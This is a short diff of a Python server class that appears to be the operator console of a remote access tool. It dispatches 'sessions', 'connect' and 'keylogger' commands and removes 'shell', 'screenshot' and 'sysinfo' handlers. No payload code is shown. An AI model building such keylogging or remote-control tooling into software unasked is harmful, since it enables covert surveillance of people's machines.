@@ -4,7 +4,6 @@ from client import CLIENT
 import socket
 import threading
 
-
 class SERVER(COMMCENTER):
     SOCKET = None
     RUNNER = True
@@ -52,8 +51,6 @@ class SERVER(COMMCENTER):
         t.daemon = True
         t.start()
 
-    #### Commands ####
-
     def execute(self, vals):
         if vals:
             if vals[0] == "exit":
@@ -62,25 +59,15 @@ class SERVER(COMMCENTER):
                 self.c_help(vals)
             elif vals[0] == "sessions":
                 self.c_sessions()
-            elif vals[0] == "ping":
-                self.c_ping(vals)
             elif vals[0] == "connect":
                 self.c_connect(vals)
             elif vals[0] == "disconnect":
                 self.c_disconnect()
-            elif vals[0] == "shell":
-                self.c_shell()
-            elif vals[0] == "clear":
-                self.c_clear()
             elif vals[0] == "keylogger":
                 self.c_keylogger(vals)
-            elif vals[0] == "sysinfo":
-                self.c_sysinfo()
-            elif vals[0] == "screenshot":
-                self.c_screenshot()
 
     def launch(self):
-        print_green("Launching Interface! Enter 'help' to get avaible commands! \n")
+        print_green("Type 'help' to see commands")
 
         while True:
             val = get_com(self.CURRENT)
@@ -88,3 +75,4 @@ class SERVER(COMMCENTER):
 
     def close(self):
         self.SOCKET.close()
+
